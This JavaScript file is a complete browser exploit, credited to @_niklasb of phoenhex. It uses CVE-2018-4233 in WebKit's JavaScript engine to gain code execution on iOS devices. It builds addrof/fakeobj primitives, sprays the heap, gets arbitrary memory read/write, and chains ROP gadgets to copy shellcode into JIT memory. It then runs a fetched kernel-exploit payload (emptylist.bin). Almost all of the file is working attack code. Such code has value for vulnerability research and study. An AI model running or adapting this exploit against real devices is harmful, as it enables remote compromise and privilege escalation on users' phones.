/*
 * Exploit by @_niklasb from phoenhex.
 *
 * This exploit uses CVE-2018-4233 (by saelo) to get RCE in WebContent.
 * The second stage is currently Ian Beer's empty_list kernel exploit,
 * adapted to use getattrlist() instead of fgetattrlist().
 *
 * Thanks to qwerty for some Mach-O tricks.
 *
 */

function doExploit(offsets, print, callback) {
  const ITERS = 10000
  const ALLOCS = 1000

  let conversion_buffer = new ArrayBuffer(8)
  let f64 = new Float64Array(conversion_buffer)
  let i32 = new Uint32Array(conversion_buffer)
  let counter = 0

  const BASE32 = 0x100000000

  function f2i(f) {
    f64[0] = f
    return i32[0] + BASE32 * i32[1]
  }

  function i2f(i) {
    i32[0] = i % BASE32
    i32[1] = i / BASE32
    return f64[0]
  }

  function hex(x) {
    if (x < 0)
      return `-${hex(-x)}`
    return `0x${x.toString(16)}`
  }

  function xor(a, b) {
    let res = 0,
      base = 1
    for (let i = 0; i < 64; ++i) {
      res += base * ((a & 1) ^ (b & 1))
      a = (a - (a & 1)) / 2
      b = (b - (b & 1)) / 2
      base *= 2
    }
    return res
  }

  function fail(x) {
    switch (x) {
      default: {
        print('FAIL ' + x)
        throw null
        break
      }
    }
  }

  // CVE-2018-4233
  function trigger(constr, modify, res, val) {
    return eval(`
    let o = [13.37]
    let Constructor${counter} = function(o) { ${constr} }

    let hack = false

    let Wrapper = new Proxy(Constructor${counter}, {
        get: function() {
            if (hack) {
                ${modify}
            }
        }
    })

    for (let i = 0; i < ITERS; ++i)
        new Wrapper(o)

    hack = true
    let bar = new Wrapper(o)
    ${res}
    `)
  }

  let workbuf = new ArrayBuffer(0x1000000)
  let u32_buffer = new Uint32Array(workbuf)
  let u8_buffer = new Uint8Array(workbuf)
  let shellcode_length

  function pwn(callback) {
    let stage1 = {
      addrof: function (victim) {
        return f2i(trigger('this.result = o[0]', 'o[0] = val', 'bar.result', victim))
      },

      fakeobj: function (addr) {
        return trigger('o[0] = val', 'o[0] = {}', 'o[0]', i2f(addr))
      },

      test: function () {
        let addr = this.addrof({
          a: 0x1337
        })
        let x = this.fakeobj(addr)
        if (x.a != 0x1337) {
          print(`try ${counter} failed, retrying...`)
          pwn(callback)
        }
      },
    }

    // Sanity check
    stage1.test()

    let structure_spray = []
    for (let i = 0; i < 1000; ++i) {
      let ary = {
        a: 1,
        b: 2,
        c: 3,
        d: 4,
        e: 5,
        f: 6,
        g: 0xfffffff
      }
      ary['prop' + i] = 1
      structure_spray.push(ary)
    }

    let manager = structure_spray[500]
    let leak_addr = stage1.addrof(manager)
    //print('leaking from: ' + hex(leak_addr))

    function alloc_above_manager(expr) {
      let res
      do {
        for (let i = 0; i < ALLOCS; ++i) {
          structure_spray.push(eval(expr))
        }
        res = eval(expr)
      } while (stage1.addrof(res) < leak_addr)
      return res
    }

    let unboxed_size = 100

    let unboxed = alloc_above_manager('[' + '13.37,'.repeat(unboxed_size) + ']')
    let boxed = alloc_above_manager('[{}]')
    let victim = alloc_above_manager('[]')

    // Will be stored out-of-line at butterfly - 0x10
    victim.p0 = 0x1337

    function victim_write(val) {
      victim.p0 = val
    }

    function victim_read() {
      return victim.p0
    }

    i32[0] = 0x200 // Structure ID
    i32[1] = 0x01082007 - 0x10000 // Fake JSCell metadata, adjusted for boxing
    let outer = {
      p0: 0, // Padding, so that the rest of inline properties are 16-byte aligned
      p1: f64[0],
      p2: manager,
      p3: 0xfffffff, // Butterfly indexing mask
    }

    let fake_addr = stage1.addrof(outer) + 0x20
    //print('fake obj @ ' + hex(fake_addr))

    let unboxed_addr = stage1.addrof(unboxed)
    let boxed_addr = stage1.addrof(boxed)
    let victim_addr = stage1.addrof(victim)
    // print('leak ' + hex(leak_addr) +
    //   '\nunboxed ' + hex(unboxed_addr) +
    //   '\nboxed ' + hex(boxed_addr) +
    //   '\nvictim ' + hex(victim_addr))

    let holder = {
      fake: {}
    }
    holder.fake = stage1.fakeobj(fake_addr)
    // From here on GC would be uncool

    // Share a butterfly for easier boxing/unboxing
    let shared_butterfly = f2i(holder.fake[(unboxed_addr + 8 - leak_addr) / 8])
    let boxed_butterfly = holder.fake[(boxed_addr + 8 - leak_addr) / 8]
    holder.fake[(boxed_addr + 8 - leak_addr) / 8] = i2f(shared_butterfly)

    let victim_butterfly = holder.fake[(victim_addr + 8 - leak_addr) / 8]

    function set_victim_addr(where) {
      holder.fake[(victim_addr + 8 - leak_addr) / 8] = i2f(where + 0x10)
    }

    function reset_victim_addr() {
      holder.fake[(victim_addr + 8 - leak_addr) / 8] = victim_butterfly
    }

    let stage2 = {
      addrof: function (victim) {
        boxed[0] = victim
        return f2i(unboxed[0])
      },

      fakeobj: function (addr) {
        unboxed[0] = i2f(addr)
        return boxed[0]
      },

      write64: function (where, what) {
        set_victim_addr(where)
        victim_write(this.fakeobj(what))
        reset_victim_addr()
      },

      read64: function (where) {
        set_victim_addr(where)
        let res = this.addrof(victim_read())
        reset_victim_addr()
        return res
      },

      write_non_zero: function (where, values) {
        for (let i = 0; i < values.length; ++i) {
          if (values[i] != 0)
            this.write64(where + i * 8, values[i])
        }
      },

      test: function () {
        this.write64(boxed_addr + 0x10, 0xfff) // Overwrite index mask, no biggie
        if (0xfff != this.read64(boxed_addr + 0x10)) {
          fail(2)
        }
      },

      forge: function (values) {
        for (let i = 0; i < values.length; ++i)
          unboxed[1 + i] = i2f(values[i])
        return shared_butterfly + 8
      },

      clear: function () {
        outer = null
        holder.fake = null
        for (let i = 0; i < unboxed_size; ++i)
          boxed[0] = null
      },
    }
    // Test read/write
    stage2.test()
    let wrapper = document.createElement('div')

    let wrapper_addr = stage2.addrof(wrapper)
    let el_addr = stage2.read64(wrapper_addr + offsets.padding)
    let vtab_addr = stage2.read64(el_addr)

    print('if you crash now, the offsets are incorrect!', true)

    // letious offsets here
    let slide = stage2.read64(vtab_addr) - offsets.vtable
    let disablePrimitiveGigacage = offsets.disableprimitivegigacage + slide
    let callbacks = offsets.callbacks + slide
    let g_gigacageBasePtrs = offsets.g_gigacagebaseptrs + slide
    let g_typedArrayPoisons = offsets.g_typedarraypoisons + slide
    let longjmp = offsets.longjmp + slide
    let dlsym = offsets.dlsym + slide

    let startOfFixedExecutableMemoryPool = stage2.read64(offsets.startfixedmempool + slide)
    let endOfFixedExecutableMemoryPool = stage2.read64(offsets.endfixedmempool + slide)
    let jitWriteSeparateHeapsFunction = stage2.read64(offsets.jit_writeseperateheaps_func + slide)
    let useFastPermisionsJITCopy = stage2.read64(offsets.usefastpermissions_jitcopy + slide)

    let ptr_stack_check_guard = offsets.ptr_stack_check_guard + slide

    // ModelIO:0x000000018d2f6564 :
    //   ldr x8, [sp, #0x28]
    //   ldr x0, [x8, #0x18]
    //   ldp x29, x30, [sp, #0x50]
    //   add sp, sp, #0x60
    //   ret
    let pop_x8 = offsets.modelio_popx8 + slide

    // CoreAudio:0x000000018409ddbc
    //   ldr x2, [sp, #8]
    //   mov x0, x2
    //   ldp x29, x30, [sp, #0x10]
    //   add sp, sp, #0x20
    //   ret
    let pop_x2 = offsets.coreaudio_popx2 + slide

    // see jitcode.s
    let linkcode_gadget = offsets.linkcode_gadget + slide

    // print('disablePrimitiveGigacage @ ' + hex(disablePrimitiveGigacage) +
    //   '<br>g_gigacageBasePtrs @ ' + hex(g_gigacageBasePtrs) +
    //   '<br>g_typedArrayPoisons @ ' + hex(g_typedArrayPoisons) +
    //   '<br>startOfFixedExecutableMemoryPool @ ' + hex(startOfFixedExecutableMemoryPool) +
    //   '<br>endOfFixedExecutableMemoryPool @ ' + hex(endOfFixedExecutableMemoryPool) +
    //   '<br>jitWriteSeparateHeapsFunction @ ' + hex(jitWriteSeparateHeapsFunction) +
    //   '<br>useFastPermisionsJITCopy @ ' + hex(useFastPermisionsJITCopy))

    if (!useFastPermisionsJITCopy || jitWriteSeparateHeapsFunction) {
      // Probably an older phone, should be even easier
      oldDevice();
    } else {
      newDevice();
    }

    function oldDevice() {
      function makeJITCompiledFunction() {
        let func = new Function();
        for (let i = 0; i < 100000; i++) {
          func();
        }

        return func;
      }

      print('older device, should work tho...', true)
      var func = makeJITCompiledFunction();
      var funcAddr = stage2.addrof(func);

      stage2.write64(funcAddr + 8, stage2.addrof(u8_buffer))

      print("[!] Jumping into shellcode...", true);
      func.a = "a"
      print("[+++++++] SHELLCODE RUNNING?????????")
    }

    function newDevice() {
      let callback_vector = stage2.read64(callbacks)

      let poison = stage2.read64(g_typedArrayPoisons + 6 * 8)
      let buffer_addr = xor(stage2.read64(stage2.addrof(u32_buffer) + 0x18), poison)

      let shellcode_src = buffer_addr + 0x4000
      let shellcode_dst = endOfFixedExecutableMemoryPool - shellcode_length

      if (shellcode_dst < startOfFixedExecutableMemoryPool || shellcode_dst > endOfFixedExecutableMemoryPool) {
        fail(4)
      }

      stage2.write64(shellcode_src + 4, dlsym)

      let fake_stack = [
        0,
        shellcode_length, // x2
        0,

        pop_x8,

        0, 0, 0, 0, 0,
        shellcode_dst, // x8
        0, 0, 0, 0,
        stage2.read64(ptr_stack_check_guard) + 0x58,

        linkcode_gadget,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,

        shellcode_dst,
      ]

      // Set up fake vtable at offset 0
      u32_buffer[0] = longjmp % BASE32
      u32_buffer[1] = longjmp / BASE32

      // Set up fake stack at offset 0x2000
      for (let i = 0; i < fake_stack.length; ++i) {
        u32_buffer[0x2000 / 4 + 2 * i] = fake_stack[i] % BASE32
        u32_buffer[0x2000 / 4 + 2 * i + 1] = fake_stack[i] / BASE32
      }

      stage2.write_non_zero(el_addr, [
        buffer_addr, // fake vtable
        0,
        shellcode_src, // x21
        0, 0, 0, 0, 0, 0, 0,
        0, // fp

        pop_x2, // lr
        0,
        buffer_addr + 0x2000, // sp
      ])

      if (hex(stage2.read64(el_addr + 16)) === hex(shellcode_src)) {
        print('shellcode @ ' + hex(shellcode_dst))
        print('wrote shellcode, click close to execute shellcode...', true)
        wrapper.addEventListener('click', function () {});
        callback(wrapper)
      } else {
        fail('shellcode didn`t get written successfully!')
      }
    }
  }

  function print_error(e) {
    print('Error: ' + e + '\n' + e.stack)
  }

  function go(callback) {
    fetch('payloads/emptylist.bin').then((response) => {
      response.arrayBuffer().then((buffer) => {
        try {
          shellcode_length = buffer.byteLength
          if (shellcode_length > 0x1000000) {
            fail(5)
          }
          u8_buffer.set(new Uint8Array(buffer), 0x4000)
          print('got ' + shellcode_length + ' bytes of shellcode, pwning')
          pwn(callback)
        } catch (e) {
          print_error(e)
        }
      })
    })
  }

  go(callback)
}

return doExploit